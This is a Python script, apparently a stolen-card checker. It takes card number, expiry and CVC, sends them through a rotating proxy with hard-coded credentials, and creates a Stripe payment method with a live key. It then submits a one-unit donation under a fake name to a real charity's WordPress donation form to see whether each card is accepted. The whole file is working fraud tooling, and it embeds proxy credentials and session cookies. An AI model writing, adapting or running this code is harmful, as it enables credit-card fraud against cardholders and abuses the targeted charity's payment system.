import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	import requests
	username = "gloosmoke30-rotate"
	password = "gloosmoke"
	proxy = "p.webshare.io:80"
	proxy_auth = "{}:{}@{}".format(username, password, proxy)
	proxies = {
			"http":"http://{}".format(proxy_auth)
	}
	urlToGet = "http://api.ipify.org/"
	r = requests.get(urlToGet , proxies=proxies)
	print("IP Address: {}".format(r.text))
	
	import requests
	username = "gloosmoke30-rotate"
	password = "gloosmoke"
	proxy = "p.webshare.io:80"
	proxy_auth = "{}:{}@{}".format(username, password, proxy)
	proxies = {
			"http":"http://{}".format(proxy_auth)
	}
	urlToGet = "http://api.ipify.org/"
	r = requests.get(urlToGet , proxies=proxies)

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51JK6VDJiGnlh74mKQ1GiryS1MKnx7TasDKIMiUguYxCnGH3XhTpZca1AVm6tEDURDthJyRjT7NQDf93TRK4edQ2Q001UmGE3dT'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	import requests
	username = "gloosmoke30-rotate"
	password = "gloosmoke"
	proxy = "p.webshare.io:80"
	proxy_auth = "{}:{}@{}".format(username, password, proxy)
	proxies = {
	    "http":"http://{}".format(proxy_auth)
	}
	urlToGet = "http://api.ipify.org/"
	r = requests.get(urlToGet , proxies=proxies)

	cookies = {
	    '_ga': 'GA1.1.186522360.1718343650',
	    '__stripe_mid': 'bb127273-968e-43c4-b256-bbb2686e60f7018df7',
	    'cookieyes-consent': 'consentid:M1E3dFBSU2hGMkExTTlUMnVNU0dJYlR5M0VORGFPZXY,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes',
	    '_ga_5QQ9B76CWV': 'GS1.1.1718793426.2.0.1718793426.0.0.0',
	    '__stripe_sid': '2992c54b-2e3c-4e2f-9631-1eee55ec046e765107',
	}
	
	headers = {
	    'authority': 'ippocrateorg.org',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.186522360.1718343650; __stripe_mid=bb127273-968e-43c4-b256-bbb2686e60f7018df7; cookieyes-consent=consentid:M1E3dFBSU2hGMkExTTlUMnVNU0dJYlR5M0VORGFPZXY,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; _ga_5QQ9B76CWV=GS1.1.1718793426.2.0.1718793426.0.0.0; __stripe_sid=2992c54b-2e3c-4e2f-9631-1eee55ec046e765107',
	    'origin': 'https://ippocrateorg.org',
	    'referer': 'https://ippocrateorg.org/en/fai-una-donazione/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1718793514089',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=732&_fluentform_8_fluentformnonce=4110847388&_wp_http_referer=%2Ffai-una-donazione%2F&names%5Bfirst_name%5D=Toxic&names%5Blast_name%5D=Xd&email=dak47497%40gmail.com&payment_input=Altro&custom-payment-amount_1=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '8',
	}
	
	r2 = requests.post(
	    'https://ippocrateorg.org/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	return (r2.json())
